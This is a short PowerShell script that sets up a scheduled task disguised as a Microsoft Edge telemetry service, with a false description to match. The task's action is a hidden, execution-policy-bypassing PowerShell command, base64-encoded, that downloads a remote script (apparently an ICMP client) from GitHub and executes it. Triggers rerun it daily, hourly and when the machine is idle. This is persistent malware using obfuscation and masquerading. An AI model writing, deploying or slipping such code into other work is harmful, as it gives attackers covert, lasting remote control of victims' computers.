if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
}
$ac = New-ScheduledTaskAction New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoLogo -NonInteractive -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA'
$st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -IdleDuration 00:02:00 -IdleWaitTimeout 23:00:00
$tr = New-ScheduledTaskTrigger -Daily -At ((Get-Date).AddMinutes(5))
$tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)

$tr.Repetition = $tr2.Repetition

Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Description "This task initiates the background task for Microsoft Edge Telemetry Agent, which scans and uploads basic usage and error information for Microsoft Edge solution." -Action $ac -Settings $st -Trigger $tr